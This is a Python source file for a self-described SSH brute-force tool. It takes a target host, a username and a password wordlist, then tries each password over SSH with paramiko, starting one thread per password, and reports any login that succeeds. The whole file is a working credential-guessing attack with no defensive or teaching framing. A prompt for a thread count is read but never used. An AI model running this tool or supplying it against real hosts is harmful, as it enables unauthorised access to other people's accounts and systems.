import time
import paramiko
import threading
import keyboard
from pwn import *

RED = '\033[91m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'

STOP_EVENT = threading.Event()

def print_banner():
    print(RED + "**************************************" + RED)
    print(WARNING + "*         SSH Brute Force Tool        *" + WARNING)
    print(RED + "**************************************" + RED)

def ssh_brute_force(host, username, password):
    try:
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(host, username=username, password=password, timeout=5)
        ssh_client.close()
        print(OKGREEN + f'[+] Connected with password {password}' + OKGREEN)
        return True
    except paramiko.ssh_exception.AuthenticationException:
        return False
    except Exception as e:
        print(f"Error: {e}")
        return False

def keyboard_listener():
    global STOP_EVENT
    while True:
        if keyboard.is_pressed('q'):
            print("\nBrute force attack interrupted by user.")
            STOP_EVENT.set()
            break
        time.sleep(0.1)

def main():
    global STOP_EVENT
    print_banner()
    print("\nInitializing brute force attack...\n")
    
    host = input("Enter the target Host IP: ")
    username = input("Enter the target Username: ")
    
    password_list_path = input("Enter the path to the password list file: ")
    with open(password_list_path, "r") as password_list:
        passwords = [password.strip() for password in password_list]

    num_threads = int(input("Enter the number of threads: "))
    
    # Start keyboard listener thread
    keyboard_thread = threading.Thread(target=keyboard_listener)
    keyboard_thread.start()
    
    # Create threads for SSH brute force
    threads = []
    for password in passwords:
        if STOP_EVENT.is_set():
            break
        t = threading.Thread(target=ssh_brute_force, args=(host, username, password))
        threads.append(t)
        t.start()

    # Wait for all threads to complete
    for t in threads:
        t.join()

    # Stop keyboard listener thread
    keyboard_thread.join()

    print("\nBrute force attack completed.")

if __name__ == "__main__":
    main()
